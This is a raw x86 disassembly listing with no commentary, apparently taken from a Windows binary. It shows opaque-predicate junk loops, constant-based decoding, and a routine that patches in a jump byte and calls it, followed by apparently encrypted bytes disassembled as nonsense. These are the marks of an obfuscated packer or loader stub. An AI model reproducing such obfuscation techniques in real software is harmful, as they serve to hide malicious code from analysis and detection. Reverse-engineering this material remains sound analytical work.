  41b81b:	call   DWORD PTR ds:0x42a7b7
  41b821:	cmp    DWORD PTR ds:0x42914b,0xb
  41b828:	jne    0x41b83b
  41b82e:	mov    esi,DWORD PTR ds:0x42914b
  41b834:	inc    esi
  41b835:	mov    DWORD PTR ds:0x42914b,esi
  41b83b:	cmp    DWORD PTR ds:0x42914b,0x13
  41b842:	jb     0x41b7f0
  41b848:	sub    eax,ecx
  41b84a:	mov    DWORD PTR ds:0x4291e7,0x17
  41b854:	cmp    DWORD PTR ds:0x4291e7,0x0
  41b85b:	je     0x41b88b
  41b861:	cmp    DWORD PTR ds:0x4291e7,0x22
  41b868:	jbe    0x41b88b
  41b86e:	jmp    0x41b879
  41b873:	call   DWORD PTR ds:0x42a7bb
  41b879:	mov    edi,DWORD PTR ds:0x4291e7
  41b87f:	dec    edi
  41b880:	mov    DWORD PTR ds:0x4291e7,edi
  41b886:	jmp    0x41b854
  41b88b:	mov    DWORD PTR [ebp-0x1c],eax
  41b88e:	or     DWORD PTR [ebp-0x1c],0xf89c8581
  41b895:	add    eax,eax
  41b897:	mov    eax,DWORD PTR [ebp-0x20]
  41b89a:	mov    ecx,DWORD PTR [ebp-0x20]
  41b89d:	sub    eax,ecx
  41b89f:	and    DWORD PTR ds:0x4291b3,0x0
  41b8a9:	jmp    0x41b8bb
  41b8ae:	mov    esi,DWORD PTR ds:0x4291b3
  41b8b4:	inc    esi
  41b8b5:	mov    DWORD PTR ds:0x4291b3,esi
  41b8bb:	cmp    DWORD PTR ds:0x4291b3,0x1e
  41b8c2:	jae    0x41b8ef
  41b8c8:	cmp    DWORD PTR ds:0x4291b3,0x28
  41b8cf:	jle    0x41b8ef
  41b8d5:	jmp    0x41b8ea
  41b8da:	push   0x4291c7
  41b8df:	push   0x428047
  41b8e4:	call   DWORD PTR ds:0x42a7bf
  41b8ea:	jmp    0x41b8ae
  41b8ef:	mov    DWORD PTR [ebp-0x20],eax
  41b8f2:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8f5:	mov    ecx,DWORD PTR [ebp-0x20]
  41b8f8:	neg    edi
  41b8fa:	mov    esi,0x75108ac
  41b8ff:	xor    eax,esi
  41b901:	mov    edi,0x3272f3
  41b906:	add    eax,edi
  41b908:	or     eax,ecx
  41b90a:	mov    DWORD PTR [ebp-0x20],eax
  41b90d:	mov    eax,DWORD PTR [ebp-0x4]
  41b910:	mov    ecx,DWORD PTR [ebp-0x4]
  41b913:	sub    eax,ecx
  41b915:	mov    DWORD PTR [ebp-0x4],eax
  41b918:	or     DWORD PTR [ebp-0x4],0xf89c85be
  41b91f:	mov    eax,DWORD PTR [ebp-0xc]
  41b922:	xor    eax,esi
  41b924:	add    eax,edi
  41b926:	push   eax
  41b927:	mov    eax,DWORD PTR [ebp-0x10]
  41b92a:	xor    eax,esi
  41b92c:	add    eax,edi
  41b92e:	push   eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x4]
  41b932:	xor    eax,esi
  41b934:	add    eax,edi
  41b936:	push   eax
  41b937:	lea    eax,[ebp-0x78]
  41b93a:	push   eax
  41b93b:	push   DWORD PTR [ebp-0x2c]
  41b93e:	push   DWORD PTR [ebp-0x28]
  41b941:	call   0x411b80
  41b946:	test   eax,eax
  41b948:	je     0x41b976
  41b94e:	lea    eax,[ebp-0x78]
  41b951:	push   eax
  41b952:	mov    eax,DWORD PTR [ebp-0x28]
  41b955:	xor    eax,esi
  41b957:	add    eax,edi
  41b959:	push   eax
  41b95a:	mov    eax,DWORD PTR [ebp-0x24]
  41b95d:	add    eax,0xaa
  41b962:	push   eax
  41b963:	mov    eax,DWORD PTR [ebp-0x24]
  41b966:	mov    eax,DWORD PTR [eax+0x198]
  41b96c:	push   DWORD PTR [eax]
  41b96e:	call   0x4085e5
  41b973:	mov    DWORD PTR [ebp-0x14],eax
  41b976:	mov    ecx,DWORD PTR ds:0x428403
  41b97c:	lea    eax,[ebp+0x4]
  41b97f:	mov    DWORD PTR [ecx*4+0x4283fb],eax
  41b986:	inc    DWORD PTR ds:0x428403
  41b98c:	mov    eax,DWORD PTR [ebp-0x14]
  41b98f:	test   eax,eax
  41b991:	je     0x41b9f9
  41b997:	lea    eax,[ebp-0x8]
  41b99a:	mov    DWORD PTR [ebp-0x34],eax
  41b99d:	mov    eax,DWORD PTR [ebp-0x30]
  41b9a0:	mov    DWORD PTR [ebp-0x8],eax
  41b9a3:	mov    eax,DWORD PTR [ebp-0x8]
  41b9a6:	mov    ecx,DWORD PTR [ebp-0x14]
  41b9a9:	sub    eax,ecx
  41b9ab:	mov    DWORD PTR [ebp-0x8],eax
  41b9ae:	mov    ecx,DWORD PTR [ebp-0x4]
  41b9b1:	xor    ecx,esi
  41b9b3:	mov    eax,0xffcd8d0d
  41b9b8:	sub    eax,ecx
  41b9ba:	add    DWORD PTR [ebp-0x8],eax
  41b9bd:	mov    eax,DWORD PTR [ebp-0x8]
  41b9c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41b9c3:	mov    DWORD PTR [ecx+0x1],eax
  41b9c6:	mov    eax,DWORD PTR [ebp-0x14]
  41b9c9:	push   DWORD PTR [ebp-0x24]
  41b9cc:	mov    BYTE PTR [eax],0xe9
  41b9cf:	mov    eax,ds:0x428187
  41b9d4:	push   DWORD PTR [eax]
  41b9d6:	push   DWORD PTR ds:0x4283eb
  41b9dc:	push   DWORD PTR ds:0x42818f
  41b9e2:	push   DWORD PTR ds:0x4283cb
  41b9e8:	push   DWORD PTR ds:0x428f4f
  41b9ee:	push   DWORD PTR [ebp-0x28]
  41b9f1:	push   DWORD PTR [ebp-0x2c]
  41b9f4:	mov    eax,DWORD PTR [ebp-0x14]
  41b9f7:	call   eax
  41b9f9:	pop    edi
  41b9fa:	pop    esi
  41b9fb:	leave  
  41b9fc:	ret    
  41b9fd:	push   ebp
  41b9fe:	mov    ebp,esp
  41ba00:	sub    esp,0x1c
  41ba03:	adc    DWORD PTR ds:0x4291bf,0x12a2
  41ba0d:	mov    DWORD PTR [ebp-0x10],0xf89f85a1
  41ba14:	sub    DWORD PTR ds:0x4291b3,0x1e28
  41ba1e:	lea    eax,[ebp+0x14]
  41ba21:	movzx  edx,BYTE PTR ds:0x4291c7
  41ba28:	sbb    edx,DWORD PTR ds:0x4291ef
  41ba2e:	mov    DWORD PTR ds:0x4291c7,edx
  41ba34:	mov    DWORD PTR [ebp-0x4],eax
  41ba37:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  41ba3e:	and    DWORD PTR ds:0x4291a3,0x0
  41ba48:	jmp    0x41ba5a
  41ba4d:	mov    edx,DWORD PTR ds:0x4291a3
  41ba53:	inc    edx
  41ba54:	mov    DWORD PTR ds:0x4291a3,edx
  41ba5a:	cmp    DWORD PTR ds:0x4291a3,0x1c
  41ba61:	jae    0x41ba87
  41ba67:	cmp    DWORD PTR ds:0x4291a3,0x2a
  41ba6e:	jb     0x41ba87
  41ba74:	jmp    0x41ba82
  41ba79:	push   DWORD PTR [ebp-0x10]
  41ba7c:	call   DWORD PTR ds:0x42a7c3
  41ba82:	jmp    0x41ba4d
  41ba87:	lea    eax,[ebp-0xc]
  41ba8a:	add    DWORD PTR ds:0x4291d7,ecx
  41ba90:	mov    DWORD PTR [ebp-0x14],eax
  41ba93:	xor    ecx,eax
  41ba95:	mov    eax,DWORD PTR [ebp-0xc]
  41ba98:	mov    ecx,DWORD PTR ds:0x42921f
  41ba9e:	mov    edx,DWORD PTR ds:0x4298eb
  41baa4:	sub    edx,ecx
  41baa6:	xor    ecx,DWORD PTR [ecx+edx*1]
  41baa9:	mov    edx,DWORD PTR [ebp-0x14]
  41baac:	adc    ecx,0x3c0d
  41bab2:	mov    ecx,0x75108ac
  41bab7:	adc    DWORD PTR ds:0x4291eb,0xbc
  41bac1:	xor    eax,ecx
  41bac3:	or     DWORD PTR ds:0x4291eb,0x4291d3
  41bacd:	add    eax,0x3272f3
  41bad2:	xor    DWORD PTR ds:0x4291db,0x429193
  41badc:	mov    DWORD PTR [edx],eax
  41bade:	and    DWORD PTR ds:0x429157,0x0
  41bae8:	xor    edx,edx
  41baea:	add    edx,DWORD PTR ds:0x429157
  41baf0:	inc    edx
  41baf1:	mov    DWORD PTR ds:0x429157,edx
  41baf7:	cmp    DWORD PTR ds:0x429157,0x2c
  41bafe:	jge    0x41bb29
  41bb04:	jmp    0x41bb1c
  41bb09:	push   0x4291c7
  41bb0e:	push   0x4291db
  41bb13:	push   DWORD PTR [ebp-0x20]
  41bb16:	call   DWORD PTR ds:0x42a7cb
  41bb1c:	cmp    DWORD PTR ds:0x429157,0x1d
  41bb23:	jb     0x41bae8
  41bb29:	mov    eax,ds:0x428183
  41bb2e:	mov    edx,DWORD PTR [ebp-0x4]
  41bb31:	mov    eax,DWORD PTR [eax]
  41bb33:	add    eax,DWORD PTR [edx]
  41bb35:	mov    DWORD PTR ds:0x4291e7,0x17
  41bb3f:	cmp    DWORD PTR ds:0x4291e7,0x0
  41bb46:	je     0x41bb7d
  41bb4c:	cmp    DWORD PTR ds:0x4291e7,0x22
  41bb53:	ja     0x41bb7d
  41bb59:	jmp    0x41bb69
  41bb5e:	push   0x40e7
  41bb63:	call   DWORD PTR ds:0x42a793
  41bb69:	xor    edx,edx
  41bb6b:	or     edx,DWORD PTR ds:0x4291e7
  41bb71:	dec    edx
  41bb72:	mov    DWORD PTR ds:0x4291e7,edx
  41bb78:	jmp    0x41bb3f
  41bb7d:	push   esi
  41bb7e:	sub    edx,0x5425
  41bb84:	mov    DWORD PTR [ebp-0x8],eax
  41bb87:	mov    edx,DWORD PTR [ebp+0x8]
  41bb8a:	mov    eax,ds:0x42830b
  41bb8f:	mov    esi,DWORD PTR ds:0x429c6f
  41bb95:	mov    esi,DWORD PTR [esi]
  41bb97:	adc    DWORD PTR ds:0x42919f,esi
  41bb9d:	mov    eax,DWORD PTR [eax+0x198]
  41bba3:	xor    edx,ecx
  41bba5:	and    DWORD PTR ds:0x4291cf,ecx
  41bbab:	mov    esi,0x3272f3
  41bbb0:	add    edx,esi
  41bbb2:	mov    DWORD PTR ds:0x4291c7,0x7ba3
  41bbbc:	cmp    DWORD PTR [eax],edx
  41bbbe:	mov    DWORD PTR ds:0x4291df,0x7d4d
  41bbc8:	je     0x41bbdb
  41bbce:	not    DWORD PTR ds:0x42917b
  41bbd4:	mov    eax,DWORD PTR [eax]
  41bbd6:	jmp    0x4207f9
  41bbdb:	mov    eax,DWORD PTR [ebp+0x18]
  41bbde:	xor    DWORD PTR ds:0x429183,0x42919f
  41bbe8:	xor    eax,ecx
  41bbea:	push   ebx
  41bbeb:	add    eax,esi
  41bbed:	xor    DWORD PTR ds:0x429197,edi
  41bbf3:	xor    edx,edx
  41bbf5:	sub    DWORD PTR ds:0x4291e3,edi
  41bbfb:	mov    ebx,0xfabdbed6
  41bc00:	add    eax,ebx
  41bc02:	mov    DWORD PTR ds:0x4291cb,0x2663
  41bc0c:	push   edi
  41bc0d:	adc    edx,0xffffffff
  41bc10:	and    DWORD PTR ds:0x4291a3,0x0
  41bc1a:	jmp    0x41bc2e
  41bc1f:	xor    edi,edi
  41bc21:	xor    edi,DWORD PTR ds:0x4291a3
  41bc27:	inc    edi
  41bc28:	mov    DWORD PTR ds:0x4291a3,edi
  41bc2e:	cmp    DWORD PTR ds:0x4291a3,0x1f
  41bc35:	jae    0x41bc68
  41bc3b:	cmp    DWORD PTR ds:0x4291a3,0x22
  41bc42:	jl     0x41bc68
  41bc48:	jmp    0x41bc63
  41bc4d:	push   DWORD PTR [ebp-0x24]
  41bc50:	push   0x42810e
  41bc55:	push   0x42812a
  41bc5a:	push   DWORD PTR [ebp-0x1c]
  41bc5d:	call   DWORD PTR ds:0x42a79b
  41bc63:	jmp    0x41bc1f
  41bc68:	mov    edi,0x8a29a13f
  41bc6d:	xor    eax,edi
  41bc6f:	sub    DWORD PTR ds:0x429197,0x48a0
  41bc79:	xor    edx,0x0
  41bc7c:	mov    DWORD PTR ds:0x42919f,0x3301
  41bc86:	cmp    eax,0x70941fe9
  41bc8b:	mov    DWORD PTR ds:0x429167,0x2e01
  41bc95:	jne    0x41bcc2
  41bc9b:	mov    DWORD PTR ds:0x4291a3,0x73ae
  41bca5:	cmp    edx,0xffffffff
  41bca8:	jne    0x41bcc2
  41bcae:	push   0xf89c85a2
  41bcb3:	mov    DWORD PTR ds:0x4291af,0x3feb
  41bcbd:	jmp    0x4207e6
  41bcc2:	mov    eax,DWORD PTR [ebp+0x18]
  41bcc5:	xor    eax,ecx
  41bcc7:	adc    DWORD PTR ds:0x42916b,0x4291af
  41bcd1:	add    eax,esi
  41bcd3:	sub    DWORD PTR ds:0x429163,0x429173
  41bcdd:	xor    edx,edx
  41bcdf:	add    eax,ebx
  41bce1:	mov    DWORD PTR ds:0x429163,0x4b51
  41bceb:	adc    edx,0xffffffff
  41bcee:	sub    DWORD PTR ds:0x4291af,0x6866
  41bcf8:	xor    eax,edi
  41bcfa:	or     DWORD PTR ds:0x42914f,0x4291db
  41bd04:	xor    edx,0x0
  41bd07:	mov    DWORD PTR ds:0x4291eb,0x1dc4
  41bd11:	cmp    eax,0x70941fe7
  41bd16:	mov    DWORD PTR ds:0x429153,0x3724
  41bd20:	jne    0x4207d3
  41bd26:	cmp    edx,0xffffffff
  41bd29:	mov    DWORD PTR ds:0x4291ef,0x5140
  41bd33:	jne    0x4207d3
  41bd39:	add    DWORD PTR ds:0x429193,0x7d28
  41bd43:	mov    eax,DWORD PTR [ebp+0x10]
  41bd46:	mov    DWORD PTR ds:0x42916b,0x1b
  41bd50:	cmp    DWORD PTR ds:0x42916b,0x0
  41bd57:	je     0x41bd93
  41bd5d:	cmp    DWORD PTR ds:0x42916b,0x1d
  41bd64:	jl     0x41bd93
  41bd6a:	jmp    0x41bd7f
  41bd6f:	push   0x2cfc
  41bd74:	push   0x400000
  41bd79:	call   DWORD PTR ds:0x42a79f
  41bd7f:	xor    edx,edx
  41bd81:	xor    edx,DWORD PTR ds:0x42916b
  41bd87:	dec    edx
  41bd88:	mov    DWORD PTR ds:0x42916b,edx
  41bd8e:	jmp    0x41bd50
  41bd93:	xor    eax,ecx
  41bd95:	add    eax,esi
  41bd97:	mov    DWORD PTR [ebp-0x18],eax
  41bd9a:	sub    DWORD PTR ds:0x42918f,0x3e4b
  41bda4:	mov    eax,DWORD PTR [ebp+0xc]
  41bda7:	and    DWORD PTR ds:0x429183,0x0
  41bdb1:	jmp    0x41bdc5
  41bdb6:	xor    edx,edx
  41bdb8:	add    edx,DWORD PTR ds:0x429183
  41bdbe:	inc    edx
  41bdbf:	mov    DWORD PTR ds:0x429183,edx
  41bdc5:	cmp    DWORD PTR ds:0x429183,0x19
  41bdcc:	jae    0x41bdf4
  41bdd2:	cmp    DWORD PTR ds:0x429183,0x28
  41bdd9:	jbe    0x41bdf4
  41bddf:	jmp    0x41bdef
  41bde4:	push   0x429193
  41bde9:	call   DWORD PTR ds:0x42a7a3
  41bdef:	jmp    0x41bdb6
  41bdf4:	mov    edx,DWORD PTR [ebp-0x8]
  41bdf7:	mov    DWORD PTR ds:0x4291ab,0x2654
  41be01:	xor    eax,ecx
  41be03:	add    eax,esi
  41be05:	adc    DWORD PTR ds:0x4291e7,0x4291db
  41be0f:	imul   eax,DWORD PTR [edx]
  41be12:	mov    edx,DWORD PTR [ebp+0x8]
  41be15:	or     DWORD PTR ds:0x42914b,0x4291d3
  41be1f:	xor    edx,ecx
  41be21:	add    edx,esi
  41be23:	mov    DWORD PTR ds:0x4291e7,0x151c
  41be2d:	cmp    edx,eax
  41be2f:	mov    eax,DWORD PTR [ebp-0x4]
  41be32:	je     0x41beca
  41be38:	mov    DWORD PTR ds:0x429163,0x16
  41be42:	cmp    DWORD PTR ds:0x429163,0x0
  41be49:	je     0x41be83
  41be4f:	cmp    DWORD PTR ds:0x429163,0x1a
  41be56:	ja     0x41be83
  41be5c:	jmp    0x41be71
  41be61:	push   0x4e27
  41be66:	push   0x4280a5
  41be6b:	call   DWORD PTR ds:0x42a7a7
  41be71:	mov    edx,DWORD PTR ds:0x429163
  41be77:	dec    edx
  41be78:	mov    DWORD PTR ds:0x429163,edx
  41be7e:	jmp    0x41be42
  41be83:	mov    edx,DWORD PTR [ebp-0x18]
  41be86:	or     DWORD PTR ds:0x42917f,0x4f4
  41be90:	add    DWORD PTR [eax],edx
  41be92:	and    eax,0x7343
  41be97:	mov    eax,DWORD PTR [ebp-0x4]
  41be9a:	mov    edx,DWORD PTR [ebp+0xc]
  41be9d:	xor    edx,ecx
  41be9f:	add    edx,esi
  41bea1:	imul   edx,DWORD PTR [eax]
  41bea4:	sbb    DWORD PTR ds:0x429183,0x4291b3
  41beae:	mov    DWORD PTR [eax],edx
  41beb0:	mov    eax,DWORD PTR [ebp-0x4]
  41beb3:	mov    DWORD PTR [ebp-0x1c],eax
  41beb6:	mov    eax,DWORD PTR [ebp+0x10]
  41beb9:	xor    eax,ecx
  41bebb:	mov    edx,0xffcd8d0d
  41bec0:	sub    edx,eax
  41bec2:	mov    eax,DWORD PTR [ebp-0x1c]
  41bec5:	jmp    0x41bee4
  41beca:	mov    edx,DWORD PTR [ebp+0x14]
  41becd:	xor    DWORD PTR [eax],edx
  41becf:	mov    eax,DWORD PTR [ebp-0x4]
  41bed2:	mov    DWORD PTR [ebp-0x1c],eax
  41bed5:	mov    eax,DWORD PTR [ebp+0x10]
  41bed8:	xor    eax,ecx
  41beda:	mov    edx,0xffcd8d0d
  41bedf:	sub    edx,eax
  41bee1:	mov    eax,DWORD PTR [ebp-0x1c]
  41bee4:	add    DWORD PTR [eax],edx
  41bee6:	mov    eax,DWORD PTR [ebp-0x4]
  41bee9:	mov    edx,DWORD PTR [ebp-0x8]
  41beec:	add    edx,DWORD PTR [eax]
  41beee:	mov    DWORD PTR [ebp-0x8],edx
  41bef1:	mov    eax,DWORD PTR [ebp+0xc]
  41bef4:	mov    edx,DWORD PTR [ebp+0xc]
  41bef7:	xor    edx,ecx
  41bef9:	xor    eax,ecx
  41befb:	lea    eax,[eax+edx*1+0x64e5e6]
  41bf02:	mov    edx,DWORD PTR [ebp+0xc]
  41bf05:	xor    edx,ecx
  41bf07:	add    edx,esi
  41bf09:	imul   eax,edx
  41bf0c:	mov    edx,DWORD PTR [ebp+0xc]
  41bf0f:	xor    edx,ecx
  41bf11:	sub    edx,eax
  41bf13:	mov    eax,DWORD PTR [ebp-0x4]
  41bf16:	add    edx,esi
  41bf18:	cmp    DWORD PTR [eax],edx
  41bf1a:	mov    eax,DWORD PTR [ebp-0x4]
  41bf1d:	jg     0x41bf3a
  41bf23:	mov    DWORD PTR [ebp-0x1c],eax
  41bf26:	mov    eax,DWORD PTR [ebp+0x10]
  41bf29:	xor    eax,ecx
  41bf2b:	mov    edx,0xffcd8d0d
  41bf30:	sub    edx,eax
  41bf32:	mov    eax,DWORD PTR [ebp-0x1c]
  41bf35:	jmp    0x41bf41
  41bf3a:	mov    edx,DWORD PTR [ebp+0x10]
  41bf3d:	xor    edx,ecx
  41bf3f:	add    edx,esi
  41bf41:	add    DWORD PTR [eax],edx
  41bf43:	mov    eax,DWORD PTR [ebp-0x8]
  41bf46:	mov    edx,DWORD PTR [ebp-0x10]
  41bf49:	mov    eax,DWORD PTR [eax]
  41bf4b:	xor    edx,ecx
  41bf4d:	add    edx,0x3272f2
  41bf53:	not    edx
  41bf55:	and    eax,edx
  41bf57:	mov    DWORD PTR [ebp-0x4],eax
  41bf5a:	movsx  eax,BYTE PTR [eax+0x1]
  41bf5e:	cdq    
  41bf5f:	add    eax,ebx
  41bf61:	adc    edx,0xffffffff
  41bf64:	jmp    0x41e327
  41bf69:	pop    esi
  41bf6a:	push   0x85807d90
  41bf6f:	xchg   esi,eax
  41bf70:	dec    eax
  41bf71:	add    cl,BYTE PTR [ebx+0x3]
  41bf74:	rcr    DWORD PTR [ecx-0x44ac93d5],cl
  41bf7a:	stc    
  41bf7b:	add    BYTE PTR [ebx-0x7c7ca327],0xd8
  41bf82:	or     DWORD PTR [edi],0x98f9d9e6
  41bf88:	(bad)  
  41bf89:	mov    esi,0x2b5776c9
  41bf8e:	mov    ?,WORD PTR [esi-0x1b]
  41bf91:	cli    
  41bf92:	add    al,0xe5
  41bf94:	ret    
  41bf95:	sbb    DWORD PTR [esi-0x14b56a0d],esi
  41bf9b:	adc    bh,bh
  41bf9d:	or     edi,eax
  41bf9f:	push   es
  41bfa0:	test   al,0x2b
  41bfa2:	push   edi
  41bfa3:	pop    es
  41bfa4:	inc    eax
  41bfa5:	bnd ret 0x5493
  41bfa9:	sub    eax,0x8b923bb6
  41bfae:	jbe    0x41bfc5
  41bfb0:	push   esp
  41bfb1:	aas    
  41bfb2:	enter  0xc021,0x44
  41bfb6:	xchg   ebp,eax
  41bfb7:	out    0xd,eax
  41bfb9:	ss pop ebx
  41bfbb:	pop    eax
  41bfbc:	xor    DWORD PTR [ebx+edi*8],esp
  41bfbf:	mov    eax,0x25c65218
  41bfc4:	cld    
  41bfc5:	push   ds
  41bfc6:	sub    BYTE PTR [eax],dl
  41bfc8:	ins    BYTE PTR es:[edi],dx
  41bfc9:	add    DWORD PTR [eax-0x3a0233dc],esi
  41bfcf:	mov    dl,0xa8
  41bfd1:	cpuid  
  41bfd3:	or     BYTE PTR ds:0x6aabfd63,bl
  41bfd9:	cdq    
  41bfda:	sbb    al,0xcc
  41bfdc:	rol    dh,cl
  41bfde:	out    0x7b,eax
  41bfe0:	test   al,0xc3
  41bfe2:	outs   dx,DWORD PTR ds:[esi]
  41bfe3:	cdq    
  41bfe4:	lock repnz aad 0x17
  41bfe8:	(bad)  
  41bfea:	neg    DWORD PTR [eax]
  41bfec:	das    
  41bfed:	push   esp
  41bfee:	outs   dx,DWORD PTR ds:[esi]
  41bfef:	mov    bl,0x5c
  41bff1:	mov    bh,bh
  41bff3:	push   0x6d
  41bff5:	js     0x41bfcd
  41bff7:	adc    BYTE PTR [esi],ah
  41bff9:	push   0xddeaa5e
  41bffe:	cmp    BYTE PTR [ebx],bl
  41c000:	mov    esi,0xbcfa098
  41c005:	push   edi
  41c006:	jo     0x41bfee
  41c008:	fdivrp st(3),st
  41c00a:	and    ah,cl
  41c00c:	sbb    DWORD PTR [esi-0x684b339e],edi
  41c012:	out    dx,al
  41c013:	inc    eax
  41c014:	lods   al,BYTE PTR ds:[esi]
  41c015:	inc    eax
  41c016:	sar    DWORD PTR [esi-0x4d],0xf
  41c01a:	ror    BYTE PTR [edx],cl
  41c01c:	jmp    0x22f:0x776f3037
  41c023:	into   
  41c024:	jg     0x41bfc8
  41c026:	inc    esp
  41c027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c028:	mov    edx,DWORD PTR [edi+0x4c04c17b]
  41c02e:	xchg   ebx,eax
  41c02f:	or     ebp,esi
  41c031:	xchg   ebx,eax
  41c032:	mov    ebp,0x175fbd9b
  41c037:	inc    esi
  41c038:	mov    ds:0xeb8a311,al
  41c03d:	(bad)  
  41c03e:	cmp    al,0x2
  41c040:	outs   dx,DWORD PTR ds:[esi]
  41c041:	inc    edx
  41c042:	neg    bh
  41c044:	add    eax,0xe27b82a0
  41c049:	and    BYTE PTR [esi],bl
  41c04b:	mov    ah,0xad
  41c04d:	dec    esi
  41c04e:	inc    eax
  41c04f:	adc    BYTE PTR [ebp+0x30],bl
  41c052:	(bad)  
  41c053:	cmp    edx,DWORD PTR [edi+0x2bda2896]
  41c059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c05a:	or     eax,0x83cada13
  41c05f:	push   DWORD PTR [esi+0x5a]
  41c062:	mov    esp,cs
  41c064:	cmp    al,0x87
  41c066:	lods   al,BYTE PTR gs:[esi]
  41c068:	push   ecx
  41c069:	adc    ecx,edx
  41c06b:	sbb    ebp,ebx
  41c06d:	push   0xffffffec
  41c06f:	adc    DWORD PTR [ebp+0x2abad835],edx
  41c075:	lods   eax,DWORD PTR ds:[esi]
  41c076:	fst    DWORD PTR [ecx+0x2230b7b0]
  41c07c:	and    al,dh
  41c07e:	into   
  41c07f:	into   
  41c080:	in     eax,dx
  41c081:	mov    ecx,0x804aa35b
  41c086:	cli    
  41c087:	addr16 push ebp
  41c089:	fs out dx,al
  41c08b:	(bad)  
  41c08c:	shr    BYTE PTR [ebp-0x77],1
  41c08f:	jmp    0x805f:0xfedadc26
  41c096:	stc    
  41c097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c098:	push   esp
  41c099:	adc    dh,BYTE PTR [esi+ebx*4-0x65]
  41c09d:	mov    edx,0x8186aaa7
  41c0a2:	imul   edx,DWORD PTR [ecx-0x5b27ceca],0x539d7f2e
  41c0ac:	loop   0x41c0cd
  41c0ae:	jcxz   0x41c0e2
  41c0b1:	and    al,0x9f
  41c0b3:	xor    bh,dl
  41c0b5:	jecxz  0x41c12b
  41c0b7:	pop    ss
  41c0b8:	xchg   edi,eax
  41c0b9:	ret    0xb28f
  41c0bc:	clc    
  41c0bd:	hlt    
  41c0be:	addr16 jns 0x41c137
  41c0c1:	mov    ecx,0x2c227a55
  41c0c6:	jno    0x41c109
  41c0c8:	outs   dx,DWORD PTR ds:[esi]
  41c0c9:	ja     0x41c0a4
  41c0cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0cc:	jnp    0x41c12d
  41c0ce:	hlt    
  41c0cf:	push   0x48b070c8
  41c0d4:	sti    
  41c0d5:	jb     0x41c129
  41c0d7:	ss mov esp,0xe3d550cd
  41c0dd:	mov    esp,0xd60a3d90
  41c0e2:	add    DWORD PTR [ebp-0x10],edi
  41c0e5:	jmp    0x8599:0xc809f5c
  41c0ec:	add    BYTE PTR [eax+0xaf5a143],0x43
  41c0f3:	lods   eax,DWORD PTR ds:[esi]
  41c0f4:	in     eax,dx
  41c0f5:	addr16 pop esp
  41c0f7:	mov    ch,0x29
  41c0f9:	and    DWORD PTR [edi+0x344e280],edi
  41c0ff:	xor    al,0x6
  41c101:	imul   edi,DWORD PTR [eax+0x70],0x3716403
  41c108:	je     0x41c111
  41c10a:	sahf   
  41c10b:	cwde   
  41c10c:	mov    edx,DWORD PTR ds:0x10fe53ab
  41c112:	arpl   WORD PTR [ebp+0x3965f9be],di
  41c118:	add    BYTE PTR [ecx],dl
  41c11a:	xlat   BYTE PTR ds:[ebx]
  41c11b:	xor    al,0xc5
  41c11d:	pop    esi
  41c11e:	loopne 0x41c165
  41c120:	inc    eax
  41c121:	jecxz  0x41c151
  41c123:	sub    eax,0x24ac5599
  41c128:	push   eax
  41c129:	push   0x50
  41c12b:	push   0xf21a93a3
  41c130:	jne    0x41c127
  41c132:	into   
  41c133:	cwde   
  41c134:	push   edi
  41c135:	sti    
  41c136:	dec    esp
  41c137:	push   ebp
  41c138:	shrd   DWORD PTR [edi+eax*2],esi,cl
  41c13c:	dec    ebx
  41c13d:	retf   0xb86d
  41c140:	adc    edi,ebx
  41c142:	out    0x7f,eax
  41c144:	sbb    DWORD PTR [ebp+0x66d59e19],0xffffffcf
  41c14b:	imul   edx,DWORD PTR ds:0x57ac8a9d,0x27
  41c152:	gs js  0x41c157
  41c155:	or     DWORD PTR ds:0x72fb2ea2,0x24
  41c15c:	retf   0xe25d
  41c15f:	cs jmp 0x8344:0x22d70fcb
  41c167:	test   DWORD PTR [esi+0x63],esi
  41c16a:	jmp    0x41c1b5
  41c16c:	push   0x2adbff28
  41c171:	mov    dh,BYTE PTR [edi]
  41c173:	cmp    al,0x95
  41c175:	ja     0x41c16f
  41c177:	jge    0x41c11c
  41c179:	je     0x41c1bc
  41c17b:	mov    dh,0xee
  41c17d:	sub    bh,dl
  41c17f:	lock popa 
  41c181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c182:	mov    eax,ds:0x2469452a
  41c187:	icebp  
  41c188:	xchg   esi,eax
  41c189:	ja     0x41c1b9
  41c18b:	loopne 0x41c141
  41c18d:	mov    esp,ebp
  41c18f:	hlt    
  41c190:	sbb    al,0xce
  41c192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c193:	pop    es
  41c194:	xchg   ecx,eax
  41c195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c196:	sbb    eax,0xb0932162
  41c19b:	dec    ebp
  41c19c:	add    eax,edx
  41c19e:	test   eax,0xf8d91104
  41c1a3:	loop   0x41c164
  41c1a5:	arpl   WORD PTR [ebp-0x51fe62a8],dx
  41c1ab:	stc    
  41c1ac:	pop    eax
  41c1ad:	pop    edx
  41c1ae:	push   esp
  41c1af:	fwait
  41c1b0:	or     eax,0xfb5f08da
  41c1b5:	inc    esp
  41c1b6:	out    dx,al
  41c1b7:	mov    esi,0x95a72744
  41c1bc:	nop
  41c1bd:	je     0x41c153
  41c1bf:	fstp   DWORD PTR [esi-0x25]
  41c1c2:	push   0xfffffff2
  41c1c4:	push   ss
  41c1c5:	dec    eax
  41c1c6:	test   eax,0x28e7856f
  41c1cb:	cmp    BYTE PTR [edi+0x26],ah
  41c1ce:	sub    eax,0x4ba94b57
  41c1d3:	mov    ah,0x40
  41c1d5:	in     eax,dx
  41c1d6:	adc    eax,DWORD PTR [edi+0x2cd0049d]
  41c1dc:	sub    eax,0x7068e205
  41c1e1:	mov    eax,ds:0xafc0362a
  41c1e6:	cwde   
  41c1e7:	dec    esi
  41c1e8:	iret   
  41c1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ea:	add    DWORD PTR [ebp+0x770a9d93],esp
  41c1f0:	dec    edi
  41c1f1:	sub    eax,0xca6b0733
  41c1f6:	jo     0x41c18b
  41c1f8:	fs inc edx
  41c1fa:	in     eax,0xd3
  41c1fc:	dec    esp
